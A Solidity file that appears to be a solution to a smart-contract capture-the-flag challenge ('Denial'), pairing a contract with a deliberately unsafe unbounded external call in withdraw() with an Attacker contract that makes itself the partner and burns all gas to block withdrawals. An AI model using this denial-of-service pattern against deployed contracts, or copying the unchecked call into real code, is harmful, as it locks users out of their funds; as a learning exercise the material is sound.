// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

contract Denial {

    address public partner; // withdraw partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep the time of the withdrawal
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

/** CODE YOUR SOLUTION HERE */
contract Attacker {
    Denial public victim;

    constructor(Denial _victim) {
        victim = Denial(_victim);
        victim.setWithdrawPartner(address(this));
    }

    // Fallback function that consumes all gas
    receive() external payable {
        // Consumes all gas available
        while (gasleft() > 0) {
            // This loop will consume all gas
        }
    }
}
